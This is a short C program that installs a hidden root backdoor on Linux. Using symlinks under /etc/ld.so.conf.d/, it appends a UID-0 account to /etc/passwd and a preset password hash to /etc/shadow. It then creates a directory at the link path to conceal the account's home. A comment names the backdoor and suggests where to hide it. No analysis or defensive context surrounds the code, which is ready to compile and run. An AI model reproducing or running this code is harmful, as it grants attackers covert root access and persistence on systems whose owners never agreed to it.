#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//change this if you want to hide the backdoor elsewhere
char *dig = "/etc/ld.so.conf.d/";

int main(int argc, char *argv[])
{
	printf("[+] executed\n");

	char *hide_to;
	asprintf(&hide_to,"%s%s",dig,argv[1]);
	printf("[+] hiding in %s\n",hide_to);
	symlink("/etc/passwd",hide_to);
	char *passwd = ":x:0:0:root:";
	char *_passwd;
	asprintf(&_passwd,"%s%s%s%s:/bin/bash",argv[1],passwd,dig,argv[1]);
	FILE *f = fopen(hide_to,"a");
	if(f == NULL){
		printf("error\n");
		exit(1);
	}
	fprintf(f, "\n%s",_passwd);
	fclose(f);
	unlink(hide_to);
	symlink("/etc/shadow",hide_to);
	char *shadow = ":U6aMy0wojraho:16232:0:::::";
	char *_shadow;
	asprintf(&_shadow,"%s%s",argv[1],shadow);
	FILE *_f = fopen(hide_to,"a");
	if(_f == NULL){
		printf("error\n");
		exit(1);
	}
	fprintf(_f,"\n%s",_shadow);
	fclose(_f);
	unlink(hide_to);
	mkdir(hide_to,0666);
	printf("\n");
	return 0;
}
